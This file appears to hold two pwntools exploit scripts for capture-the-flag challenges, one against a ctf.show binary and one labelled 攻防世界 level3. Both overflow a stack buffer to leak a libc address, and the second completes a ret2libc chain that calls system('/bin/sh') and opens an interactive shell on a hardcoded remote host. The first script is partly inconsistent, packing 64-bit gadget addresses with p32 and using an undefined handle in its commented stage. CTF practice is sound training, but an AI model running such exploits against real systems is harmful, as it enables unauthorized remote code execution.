from pwn import *
from LibcSearcher import *
elf=ELF('./stack1')     
#p=process('./stack1')
io=remote('dasctf_sixbytes.challenge.ctf.show',28185)
pop_rdi=0x400c83
ret=0x4006b9       #ROPgadget --binary stack1 |grep "ret" 
elf_plt=elf.plt['puts']
elf_got=elf.got['puts']
main_addr=elf.symbols['main']
payload=(b'a'*0x88)+(b'a'*4)+p32(elf_plt)+p32(main_addr)+p32(elf_got)
io.sendline(payload)
io.recvuntil('\n\n')
elf_addr=u32(io.recv(4))
print(hex(elf_addr))
'''libc=LibcSearcher('puts',elf_addr)
libcbase=elf_addr-libc.dump('puts')
system_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
payload=(b'a'*0x88)+(b'a'*4)+p32(system_addr)+(b'aaaa')+p32(bin_sh)
p.recvuntil('\n\n')
p.sendline(payload)
p.interactive()'''

#攻防世界level3
from pwn import *

ip_port = "nc 61.147.171.105 61389".split(" ")
io = remote(ip_port[-2], ip_port[-1])
context.log_level="debug"

write_got = 0x804a018
read_got = 0x0804A00C
write_plt = 0x8048340
main_addr = 0x08048484

payload = b'a' * 140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.recvuntil("Input:")
io.sendline(payload)
io.recvline()
write_real_addr = u32(io.recv(4))
print(write_real_addr)

libc_base = write_real_addr - 0x000D43C0
system_real_addr = libc_base + 0x0003A940
binsh_real_addr = libc_base + 0x0015902B

payload = b'a' * 140 + p32(system_real_addr) +p32(0xabcd)+ p32(binsh_real_addr)
io.recvuntil("Input:")
io.sendline(payload)

io.interactive()
